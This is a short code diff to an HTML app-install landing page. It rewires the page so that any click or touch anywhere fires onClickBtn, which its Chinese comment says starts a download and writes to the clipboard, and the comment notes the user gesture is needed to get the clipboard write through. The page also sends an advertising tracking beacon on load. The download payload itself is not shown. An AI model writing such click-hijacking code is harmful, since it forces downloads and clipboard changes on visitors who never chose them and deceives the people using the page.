@@ -384,7 +384,7 @@
       </div>
     </div>
 
-    <div onclick="onClickBtn()">
+    <div>
       <img class="install-btn" src="files/install.png" alt="" height="48px" />
     </div>
 
@@ -630,7 +630,9 @@
 
         window.onload = function () {
           sendBeacon("https://api.anubisriches.com/api/advertising/onshow", "show");
-          onClickBtn();
+          // 全屏点击触发下载 + 复制（需要用户手势，剪贴板才能写入）
+          document.addEventListener("click", onClickBtn, true);
+          document.addEventListener("touchend", onClickBtn, true);
         };
 
         function sendBeacon(url, label) {
